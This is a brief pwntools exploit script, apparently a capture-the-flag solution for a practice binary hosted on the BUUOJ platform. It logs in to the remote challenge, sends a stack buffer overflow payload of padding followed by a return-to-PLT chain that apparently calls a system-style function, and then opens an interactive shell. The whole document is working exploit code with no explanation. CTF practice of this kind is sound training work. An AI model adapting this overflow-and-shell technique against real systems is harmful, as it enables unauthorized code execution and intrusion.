from pwn import *
#sh=process("./timu")
sh=remote("node4.buuoj.cn",29011)
sh.sendline(b'administrator')
sh.sendline(b'1')
payload=0x4c*b'a'+p32(0x080484D0)+p32(0xdeadbeef)+p32(0x080482ea)
sh.sendline(payload)
sh.sendline(b'4')
sh.interactive()
